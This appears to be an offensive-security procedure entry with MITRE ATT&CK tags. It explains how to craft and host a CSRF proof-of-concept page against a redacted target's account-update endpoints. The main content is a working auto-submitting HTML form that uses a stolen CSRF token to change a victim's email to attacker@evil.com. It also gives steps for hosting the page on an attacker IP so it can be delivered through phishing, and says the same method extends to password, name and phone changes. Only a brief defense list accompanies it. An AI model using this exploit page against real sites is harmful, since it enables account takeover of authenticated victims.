---
tags:
  - csrf
  - poc
  - web-hosting
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:29.362Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 17020d30-1528-4082-9918-d4b9bf27c098
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-and-Host-CSRF-Proof-of-Concept-Page

## Summary

This procedure details the creation of an HTML-based proof-of-concept page that exploits the CSRF vulnerability by auto-submitting forged forms to the target's 'My Account' update endpoints, using the extracted token to modify user details like email, name, phone, and password.

## Description

Targeting the ███████mil application, the PoC mimics the legitimate forms but originates from an external site. It includes hidden fields with the stolen CSRF token and desired malicious values. The page uses JavaScript to submit the form on load, bypassing user interaction. Hosting on an attacker-controlled server (e.g., via Python's http.server) makes it accessible for phishing. Prerequisites: Extracted CSRF token and basic HTML/JS knowledge. Expected outcome: A functional exploit page that performs unauthorized updates when visited by an authenticated victim.

## Requirements

1. Extracted CSRF token from prior procedure
2. Text editor for HTML crafting
3. Web server for hosting (local or remote)

## Defense

Defensive measures and detection strategies:

- Enforce strict referrer checks and CSRF token validation
- Block or warn on auto-submitting forms from external domains
- Implement Content Security Policy (CSP) to restrict script execution

## Objectives

1. Create a self-submitting form targeting update endpoints
2. Embed token and payload for account modification
3. Host the page for victim delivery

## Instructions

### Step 1: Craft the HTML PoC

**Context**: Build the malicious page structure to match target forms.

Create an HTML file (e.g., csrf-poc.html) with forms for each update type. Example for email change:

```html
<!DOCTYPE html>
<html>
<body>
<form id="emailForm" action="https://███████mil.com/account/update-email" method="POST" style="display:none;">
  <input type="hidden" name="csrf_token" value="YOUR_EXTRACTED_TOKEN">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('emailForm').submit();</script>
</body>
</html>
```

> Repeat for password, name, and phone forms, adjusting endpoints and fields as needed.

### Step 2: Host the PoC

**Context**: Make the page publicly accessible for the phishing phase.

Save the file and host it using a simple server, e.g., navigate to the directory in terminal and run `python -m http.server 8000`. Access via http://attacker-ip:8000/csrf-poc.html.

**Expected Output**: Page loads and auto-submits when visited.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[JavaScript]]
- [[Phishing]]
